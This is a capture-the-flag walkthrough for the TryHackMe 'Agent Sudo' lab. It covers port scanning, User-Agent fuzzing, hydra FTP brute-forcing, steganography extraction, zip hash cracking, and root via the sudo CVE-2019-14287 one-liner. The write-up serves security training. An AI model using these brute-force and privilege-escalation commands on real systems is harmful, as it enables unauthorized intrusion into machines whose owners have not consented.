# Agent_Sudo
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Tags
--
* Fuzzing
* Brute Forcing
* Hash Cracking
* Sudo CVE-2019-14287

Tools used
--
* nmap
* ffuf
* burp
* hydra
* binwalk
* steghide
* john

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.48.88
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.48.88 -p- -T5 -vvv

<SNIP>
Initiating SYN Stealth Scan at 20:21
Scanning 10.10.48.88 [65535 ports]
Discovered open port 22/tcp on 10.10.48.88
Discovered open port 80/tcp on 10.10.48.88
Discovered open port 21/tcp on 10.10.48.88
<SNIP>
```
Let's try to fuzz on the web application. According our fuzzing, we didn't find any directory or file. Let's read the communication on the home page:
```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```
There is an Agent R, so we can try to change User-Agent as R. If we do that, we get the following message:
```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
```
Let's try to fuzz the User-Agent with a wordlist of Uppercase letters called `agents.txt` we can create easy and then run:
```
<SNIP>
R                       [Status: 200, Size: 225, Words: 2, Lines: 1, Duration: 3578ms]
C                       [Status: 302, Size: 218, Words: 13, Lines: 19, Duration: 3585ms]
<SNIP>
```
Note that `C` result has `302` status. We must check where it redirects. By using Burpsuite, the redirection brings us to `/agent_C_attention.php` page where we get the following message:
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R
```
Let's try to bruteforce chris user by FTP service:
```
hydra -l chris -P rockyou.txt 10.10.48.88 ftp

<SNIP>
[DATA] attacking ftp://10.10.48.88:21/
[21][ftp] host: 10.10.48.88   login: chris   password: crystal
[STATUS] 14344398.00 tries/min, 14344398 tries in 00:01h, 1 to do in 00:01h, 8 active
1 of 1 target successfully completed, 1 valid password found
<SNIP>
```
Phase 2: Foothold
--
Let's enter in the FTP server with this account:
```
ftp chris@10.10.48.88
```
Inside it there are two images and one txt file with the following message:
```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```
This message suggests us that the password should be hidden inside one of the two images. Indeed, executing `binwalk` we get:
```
binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
Let's extract them by binwalk. On Arch Linux, you need to install for first 7zip and JDK for `7z` and `jar` command in order to extract the hidden contents of the file correctly:
```
sudo pacman -Syy jdk-openjdk p7zip

binwalk -e cutie.png
```
We get a `8702.zip` and the automatically extracted `To_agentR.txt`. We cannot access to this text file because the `.zip` is password-protected and this extraction was "fake". Let's try to use John for cracking the password:
```
zip2john 8702.zip > zip.hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type

john zip.hash --wordlist=~/rockyou.txt
<SNIP>
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)
<SNIP>
```
Let's extract the content and read that text file:
```
7z x 8702.zip
<Enter alien as password>

cat To_agentR.txt

Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
By decoding as Base64 `QXJlYTUx`, we get `Area51`. There are not other hints. Let's try to use StegHide on the second image (binwalk gave us no hidden content information, probably because the other image was protected by a password):
```
steghide extract -sf cute-alien.jpg

Enter passphrase:<Area51>
wrote extracted data to "message.txt".
```
In case the password was not available, we could use `stegcracker`. 

Let's read the extracted file:
```
cat message.txt

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
Let's login by SSH with james account:
```
ssh 10.10.48.88 -l james
<hackerrules!>

cat user_flag.txt
```
and we get the user flag.

Phase 3: Privilege Escalation
--
If we run LinPEAS, we can see a red string on the sudo version. If we visit https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version (CVE-2019-14287), we can run:
```
sudo -u#-1 /bin/bash
```
and we get root privileges. Now we can read the root flag at `cat /root/root.txt`.